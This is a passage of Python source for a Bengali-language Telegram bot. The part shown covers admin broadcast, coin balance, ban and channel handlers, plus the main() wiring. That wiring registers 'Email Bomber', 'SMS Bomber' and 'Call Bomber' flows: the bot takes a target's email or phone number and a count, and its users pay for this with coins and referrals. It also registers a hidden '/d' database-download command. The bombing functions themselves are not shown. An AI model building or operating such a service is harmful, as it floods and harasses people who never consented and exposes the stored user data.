        to_bold_sans("পোস্টে ইনলাইন বাটন যোগ করতে চান?"),
        reply_markup=ReplyKeyboardMarkup(
            [
                [KeyboardButton(to_bold_sans("➕ Add Button"), style="success")],
                [KeyboardButton(to_bold_sans("⏭️ Skip"), style="primary"), KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]
            ],
            resize_keyboard=True,
            input_field_placeholder=to_bold_sans("Choose option...")
        )
    )
    return BROADCAST_BTN_CHOICE

async def bc_btn_choice_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    if text == to_bold_sans("➕ Add Button") or text == "➕ Add Button":
        await update.message.reply_text(
            to_bold_sans("প্রথমে বাটনের নাম কি থাকবে তা লিখুন:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Button Name..."))
        )
        return BROADCAST_BTN_NAME
    else:
        return await show_bc_preview(update, context)

async def bc_btn_name_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    context.user_data["temp_btn_name"] = text
    await update.message.reply_text(
        to_bold_sans("এবার বাটনের লিংক (URL) দিন:"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("https://t.me/..."))
    )
    return BROADCAST_BTN_URL

async def bc_btn_url_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    context.user_data["temp_btn_url"] = text
    await update.message.reply_text(
        to_bold_sans("বাটনের স্টাইল কি হবে সিলেক্ট করুন:"),
        reply_markup=ReplyKeyboardMarkup(
            [
                [KeyboardButton(to_bold_sans("green(success)"), style="success"), KeyboardButton(to_bold_sans("blue(primary)"), style="primary")],
                [KeyboardButton(to_bold_sans("red(denger)"), style="danger"), KeyboardButton(to_bold_sans("default"))],
                [KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]
            ],
            resize_keyboard=True,
            input_field_placeholder=to_bold_sans("Select style...")
        )
    )
    return BROADCAST_BTN_STYLE

async def bc_btn_style_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    b_name = context.user_data.pop("temp_btn_name", "Button")
    b_url = context.user_data.pop("temp_btn_url", "https://t.me")
    text_lower = text.lower()
    if "success" in text_lower or "green" in text_lower:
        b_style = "success"
    elif "primary" in text_lower or "blue" in text_lower:
        b_style = "primary"
    elif "danger" in text_lower or "red" in text_lower or "denger" in text_lower:
        b_style = "danger"
    else:
        b_style = "primary"

    if "bc_buttons" not in context.user_data:
        context.user_data["bc_buttons"] = []

    context.user_data["bc_buttons"].append({"text": b_name, "url": b_url, "style": b_style})

    await update.message.reply_text(
        to_bold_sans("আরও বাটন এড করতে চান নাকি প্রিভিউ দেখতে চান?"),
        reply_markup=ReplyKeyboardMarkup(
            [
                [KeyboardButton(to_bold_sans("➕ Add Button"), style="success"), KeyboardButton(to_bold_sans("👀 Preview"), style="primary")],
                [KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]
            ],
            resize_keyboard=True,
            input_field_placeholder=to_bold_sans("Choose option...")
        )
    )
    return BROADCAST_BTN_CHOICE

async def show_bc_preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(to_bold_sans("📋 পোস্ট প্রিভিউ নিচে দেখানো হলো:"))
    bc_text = context.user_data.get("bc_text", "")
    bc_media = context.user_data.get("bc_media")
    bc_buttons = context.user_data.get("bc_buttons", [])

    markup = None
    if bc_buttons:
        rows = [[InlineKeyboardButton(to_bold_sans(b["text"]), url=b["url"], style=b.get("style", "primary"))] for b in bc_buttons]
        markup = InlineKeyboardMarkup(rows)

    try:
        if bc_media:
            m_type, m_id = bc_media
            if m_type == "photo":
                await update.message.reply_photo(photo=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
            elif m_type == "video":
                await update.message.reply_video(video=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
            elif m_type == "document":
                await update.message.reply_document(document=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
        else:
            await update.message.reply_text(text=to_bold_sans(bc_text), reply_markup=markup)
    except Exception as e:
        await update.message.reply_text(to_bold_sans(f"⚠️ প্রিভিউ দেখাতে সমস্যা হয়েছে: {str(e)}"))

    await update.message.reply_text(
        to_bold_sans("এখন কি পোস্টটি ব্রডকাস্ট করতে চান?"),
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton(to_bold_sans("🚀 Publish"), style="success"), KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]],
            resize_keyboard=True,
            input_field_placeholder=to_bold_sans("Publish or Cancel...")
        )
    )
    return BROADCAST_PREVIEW

async def bc_publish_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    admin_keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=admin_keyboard)
        return ConversationHandler.END

    if text != to_bold_sans("🚀 Publish") and text != "🚀 Publish":
        await update.message.reply_text(
            to_bold_sans("❌ অনুগ্রহ করে নিচে '🚀 Publish' অথবা '❌ Cancel' বাটনে ক্লিক করুন:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("🚀 Publish"), style="success"), KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True)
        )
        return BROADCAST_PREVIEW

    bc_text = context.user_data.get("bc_text", "")
    bc_media = context.user_data.get("bc_media")
    bc_buttons = context.user_data.get("bc_buttons", [])
    bc_type = context.user_data.get("bc_type", "all")

    markup = None
    if bc_buttons:
        rows = [[InlineKeyboardButton(to_bold_sans(b["text"]), url=b["url"], style=b.get("style", "primary"))] for b in bc_buttons]
        markup = InlineKeyboardMarkup(rows)

    if bc_type == "single":
        target_users = context.user_data.get("bc_target_users", [])
        total_users = len(target_users)
        success_count = 0
        fail_count = 0
        invalid_count = 0

        status_msg = await update.message.reply_text(to_bold_sans(f"🚀 Single Broadcast শুরু হয়েছে ({total_users} জন ইউজারের কাছে পাঠানো হচ্ছে)..."), reply_markup=ReplyKeyboardRemove())

        for uid_str in target_users:
            if uid_str not in db["users"]:
                invalid_count += 1
                continue
            try:
                uid = int(uid_str)
                if bc_media:
                    m_type, m_id = bc_media
                    if m_type == "photo":
                        await context.bot.send_photo(chat_id=uid, photo=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                    elif m_type == "video":
                        await context.bot.send_video(chat_id=uid, video=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                    elif m_type == "document":
                        await context.bot.send_document(chat_id=uid, document=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                else:
                    await context.bot.send_message(chat_id=uid, text=to_bold_sans(bc_text), reply_markup=markup)
                success_count += 1
            except Exception:
                fail_count += 1
            await asyncio.sleep(0.05)

        try:
            await status_msg.delete()
        except:
            pass

        await update.message.reply_text(
            to_bold_sans(
                "📢 BROADCAST REPORT (SINGLE)\n\n"
                f"Total Target Users: {total_users}\n"
                f"Successful Sent: {success_count}\n"
                f"Failed: {fail_count}\n"
                f"Invalid User IDs: {invalid_count}"
            ),
            reply_markup=admin_keyboard
        )
    else:
        users = db.get("users", {})
        total_users = len(users)
        success_count = 0
        fail_count = 0

        status_msg = await update.message.reply_text(to_bold_sans(f"🚀 All Broadcast শুরু হয়েছে ({total_users} জন ইউজারের কাছে পাঠানো হচ্ছে)..."), reply_markup=ReplyKeyboardRemove())

        for uid_str in users.keys():
            try:
                uid = int(uid_str)
                if bc_media:
                    m_type, m_id = bc_media
                    if m_type == "photo":
                        await context.bot.send_photo(chat_id=uid, photo=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                    elif m_type == "video":
                        await context.bot.send_video(chat_id=uid, video=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                    elif m_type == "document":
                        await context.bot.send_document(chat_id=uid, document=m_id, caption=to_bold_sans(bc_text), reply_markup=markup)
                else:
                    await context.bot.send_message(chat_id=uid, text=to_bold_sans(bc_text), reply_markup=markup)
                success_count += 1
            except Exception:
                fail_count += 1
            await asyncio.sleep(0.05)

        try:
            await status_msg.delete()
        except:
            pass

        await update.message.reply_text(
            to_bold_sans(
                "📢 BROADCAST COMPLETED!\n\n"
                f"Total Users: {total_users}\n"
                f"Successfully Sent: {success_count}\n"
                f"Failed: {fail_count}\n"
                "Broadcast Completed Successfully!"
            ),
            reply_markup=admin_keyboard
        )
    return ConversationHandler.END

async def admin_add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    parts = text.split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
        await update.message.reply_text(
            to_bold_sans("❌ Invalid format! Use: CHAT_ID AMOUNT (e.g. 123456789 100)"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("123456789 100")),
            parse_mode="Markdown"
        )
        return ADD_COIN_STATE

    target_id, amount = parts[0], int(parts[1])
    if target_id not in db["users"]:
        db["users"][target_id] = {"balance": 0, "first_name": "User"}
    
    db["users"][target_id]["balance"] += amount
    save_db(db)

    try:
        current_bal = db["users"][target_id]["balance"]
        await context.bot.send_message(
            chat_id=int(target_id),
            text=to_bold_sans(
                "🎉 Balance Added Successfully!\n\n"
                f"Amount Added: +{amount} Coins\n"
                f"Current Balance: {current_bal} Coins\n\n"
                "Thank You!"
            )
        )
    except:
        pass

    await update.message.reply_text(to_bold_sans(f"✅ Successfully added +{amount} coins to user {target_id}. New Balance: {db['users'][target_id]['balance']}"), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_cut_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    parts = text.split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
        await update.message.reply_text(
            to_bold_sans("❌ Invalid format! Use: CHAT_ID AMOUNT (e.g. 123456789 50)"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("123456789 50")),
            parse_mode="Markdown"
        )
        return CUT_COIN_STATE

    target_id, amount = parts[0], int(parts[1])
    if target_id not in db["users"]:
        await update.message.reply_text(to_bold_sans("❌ User not found in database!"), reply_markup=keyboard)
        return ConversationHandler.END

    current_bal = db["users"][target_id].get("balance", 0)
    new_bal = max(0, current_bal - amount)
    deducted_actual = current_bal - new_bal
    db["users"][target_id]["balance"] = new_bal
    save_db(db)

    try:
        await context.bot.send_message(
            chat_id=int(target_id),
            text=to_bold_sans(
                "⚠️ Balance Deducted!\n\n"
                f"Amount Deducted: -{deducted_actual} Coins\n"
                f"Current Balance: {new_bal} Coins"
            )
        )
    except:
        pass

    await update.message.reply_text(to_bold_sans(f"✅ Successfully deducted {deducted_actual} coins from user {target_id}. Current Balance: {new_bal}"), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_search_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Please enter a valid numeric Chat ID:"))
        return SEARCH_USER_STATE

    target_id = text
    if target_id not in db["users"]:
        await update.message.reply_text(to_bold_sans("❌ User not found in database!"), reply_markup=keyboard)
        return ConversationHandler.END

    u_data = db["users"][target_id]
    name = u_data.get("first_name", "Unknown")
    balance = u_data.get("balance", 0)
    total_ref = sum(1 for u in db["users"].values() if u.get("referred_by") == target_id)
    reg_info = u_data.get("reg_info", "Not available")

    res_text = (
        f"👤 USER INFORMATION\n\n"
        f"Name: {name}\n"
        f"Chat ID: {target_id}\n"
        f"Total Referral: {total_ref}\n"
        f"Current Balance: {balance} Coins\n"
        f"User Registration Information: {reg_info}"
    )
    await update.message.reply_text(to_bold_sans(res_text), reply_markup=keyboard)
    return ConversationHandler.END

async def admin_maint_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    db["maintenance_message"] = to_bold_sans(text)
    save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ Maintenance Message successfully updated to:\n\n{text}"), reply_markup=keyboard)
    return ConversationHandler.END

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Invalid User ID!"))
        return BAN_STATE

    uid = int(text)
    if uid not in db["banned_users"]:
        db["banned_users"].append(uid)
        save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ User {uid} has been banned successfully."), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Invalid User ID!"))
        return UNBAN_STATE

    uid = int(text)
    if uid in db["banned_users"]:
        db["banned_users"].remove(uid)
        save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ User {uid} has been unbanned successfully."), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if text not in db["force_channels"]:
        db["force_channels"].append(text)
        save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ Channel/Group {text} added to force subscription list."), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if text in db["force_channels"]:
        db["force_channels"].remove(text)
        save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ Channel {text} removed from force subscription list."), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def admin_set_refer_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Please enter a valid number for referral bonus:"))
        return SET_REF_BONUS_STATE
        
    new_bonus = int(text)
    db["refer_bonus"] = new_bonus
    save_db(db)
    
    keyboard = get_admin_keyboard(new_bonus, db.get("maintenance_mode", False))
    await update.message.reply_text(to_bold_sans(f"✅ Referral bonus successfully updated to {new_bonus} coin!"), parse_mode="Markdown", reply_markup=keyboard)
    return ConversationHandler.END

async def cancel_action_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = get_user_keyboard()
    await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
    return ConversationHandler.END

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    otp_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(" + to_bold_sans("💣 Email Bomber") + "|💣 Email Bomber)$"), message_router)],
        states={
            GET_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_email)],
            GET_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_limit_and_bomb)]
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    sms_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(" + to_bold_sans("💣 SMS Bomber") + "|💣 SMS Bomber)$"), message_router)],
        states={
            SMS_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sms_phone)],
            SMS_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sms_limit_and_bomb)]
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    call_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(" + to_bold_sans("💣 Call Bomber") + "|💣 Call Bomber)$"), message_router)],
        states={
            CALL_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_call_phone)],
            CALL_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_call_limit_and_bomb)]
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    redeem_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(" + to_bold_sans("🎟️ Redeem Code") + "|🎟️ Redeem Code)$"), message_router)],
        states={
            REDEEM_CODE_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_redeem_code)]
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    create_code_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(" + to_bold_sans("🎟️ Create Code") + "|🎟️ Create Code)$"), message_router)],
        states={
            CREATE_CODE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_code_code_step)],
            CREATE_CODE_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_code_limit_step)],
            CREATE_CODE_COIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_code_coin_step)],
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(callback_query_handler, pattern="^bc_all$")],
        states={
            BROADCAST_MEDIA: [MessageHandler(filters.ALL & ~filters.COMMAND, bc_media_step)],
            BROADCAST_BTN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_choice_step)],
            BROADCAST_BTN_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_name_step)],
            BROADCAST_BTN_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_url_step)],
            BROADCAST_BTN_STYLE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_style_step)],
            BROADCAST_PREVIEW: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_publish_step)],
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    single_bc_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(callback_query_handler, pattern="^bc_single$")],
        states={
            SINGLE_BC_USER_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, single_bc_user_step)],
            BROADCAST_MEDIA: [MessageHandler(filters.ALL & ~filters.COMMAND, bc_media_step)],
            BROADCAST_BTN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_choice_step)],
            BROADCAST_BTN_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_name_step)],
            BROADCAST_BTN_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_url_step)],
            BROADCAST_BTN_STYLE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_btn_style_step)],
            BROADCAST_PREVIEW: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_publish_step)],
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    admin_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex("^(" + to_bold_sans("➕ Add Balance") + "|➕ Add Balance)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("➖ Cut Balance") + "|➖ Cut Balance)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("🔍 Search User") + "|🔍 Search User)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("🚫 Ban User") + "|🚫 Ban User)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("✅ Unban User") + "|✅ Unban User)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("➕ Add Force Channel") + "|➕ Add Force Channel)$"), message_router),
            MessageHandler(filters.Regex("^(" + to_bold_sans("➖ Remove Force Channel") + "|➖ Remove Force Channel)$"), message_router),
            MessageHandler(filters.Regex("^.*(Set Refer Bonus|𝐑𝐞𝐟𝐞𝐫 𝐁𝐨𝐧𝐮𝐬).*$"), message_router),
            CallbackQueryHandler(callback_query_handler, pattern="^set_maint_msg$")
        ],
        states={
            ADD_COIN_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_balance)],
            CUT_COIN_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_cut_balance)],
            SEARCH_USER_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_search_user)],
            MAINT_MSG_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_maint_msg)],
            BAN_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_ban)],
            UNBAN_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_unban)],
            ADD_CHANNEL_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_channel)],
            REMOVE_CHANNEL_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_remove_channel)],
            SET_REF_BONUS_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_refer_bonus)],
        },
        fallbacks=[CommandHandler("cancel", cancel_action_text), MessageHandler(filters.Regex("^(" + to_bold_sans("❌ Cancel") + "|❌ Cancel)$"), cancel_action_text)]
    )

    application.add_handler(CommandHandler("start", start_handler))
    application.add_handler(CommandHandler("stop", stop_command_handler))
    application.add_handler(CommandHandler("admin", admin_command_handler))
    application.add_handler(CommandHandler("d", secret_db_download_handler))
    application.add_handler(CallbackQueryHandler(callback_query_handler))
    
    application.add_handler(otp_conv)
    application.add_handler(sms_conv)
    application.add_handler(call_conv)
    application.add_handler(redeem_conv)
    application.add_handler(create_code_conv)
    application.add_handler(broadcast_conv)
    application.add_handler(single_bc_conv)
    application.add_handler(admin_conv)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))

    print("🤖 Updated Bot is running successfully with Mathematical Sans-Serif Bold Unicode Typography & All Features...")
    application.run_polling()

if __name__ == "__main__":
    main()
